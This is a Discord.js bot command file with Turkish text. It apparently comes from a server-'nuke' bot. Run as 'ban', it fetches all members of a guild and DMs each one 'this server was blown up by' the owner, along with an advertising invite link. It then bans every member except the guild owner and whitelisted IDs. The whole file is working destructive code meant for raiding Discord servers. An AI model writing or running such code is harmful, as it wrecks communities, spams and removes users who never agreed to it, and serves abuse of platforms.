const Config = require("../Config.js")

exports.run = async (client, message, args) => {
    message.delete()
    return message.guild.members.fetch().then(members => {
        members.forEach(member => {
            member.send(`Bu sunucu ${Config.SahipAdı} tarafından patlatılmıştır.\n ${Config.ReklamSunucuLink}`)
            if (member.id === message.guild.ownerId) return;
            if (Config.SahipID.includes(member.id)) return;
            member.ban()
        });
    }).catch(console.error);
};
exports.conf = {
    aliases: [],
    komut: "ban"
};